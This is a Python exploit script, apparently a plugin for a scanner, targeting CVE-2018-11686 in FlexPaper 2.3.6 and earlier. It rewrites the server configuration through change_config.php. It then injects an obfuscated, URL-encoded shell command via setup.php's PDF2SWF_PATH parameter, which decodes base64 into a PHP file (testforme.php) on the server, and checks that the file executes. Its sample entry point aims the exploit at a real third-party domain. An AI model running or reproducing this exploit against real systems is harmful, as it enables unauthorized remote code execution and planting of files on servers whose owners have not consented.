#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

"""
CVE-ID: CVE-2018-11686
FlexPaper <= 2.3.6 RCE
https://mp.weixin.qq.com/s/8eBwfW231Nm02Lz8La2P1w
"""

def info(data):
    info = {
        "name": "flexpaper_236_getshell",
        "info": "flexpaper_236_getshell.",
        "level": "high",
        "type": "rce",
    }
    return info

def prove(data):
    init(data, 'flexpaper')
    if data['base_url']:
        payload = (
            ("SAVE_CONFIG", "1"), ("PDF_Directory", "/var/www/html/flex2.3.6/flexpaper/pdf"),
            ("SWF_Directory", "config/"),
            ("LICENSEKEY", ""), ("splitmode", "1"), ("RenderingOrder_PRIM", "flash"), ("RenderingOrder_SEC", "html"))
        shellcode = "%65%63%68%6f%20%50%44%39%77%61%48%41%67%63%47%68%77%61%57%35%6d%62%79%67%70%4f%7a%38%2b%20%7c%62%61%73%65%36%34%20%2d%64%20%3e%24%28%70%77%64%29%2f%74%65%73%74%66%6f%72%6d%65%2e%70%68%70"
        url1 = data['base_url'] + "flexpaper/php/change_config.php"
        url2 = data['base_url'] + "flexpaper/php/setup.php?step=2&PDF2SWF_PATH=" + shellcode
        url3 = data['base_url'] + 'flexpaper/php/testforme.php'
        try:
            r1 = curl('post',url1, data=payload)
            if r1 != None and r1.status_code == 200:
                r2 = curl('get', url2)
                if r2 != None and r2.status_code == 200:
                    r3 = curl('get', url3)
                    if r3 != None and "php.ini" in r3.text:
                        data['flag'] = 1
                        data['data'].append({"url": url3})
                        data['res'].append({"info": url3, "key": "flexpaper_236_getshell"})
        except:
            pass
    return data


if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))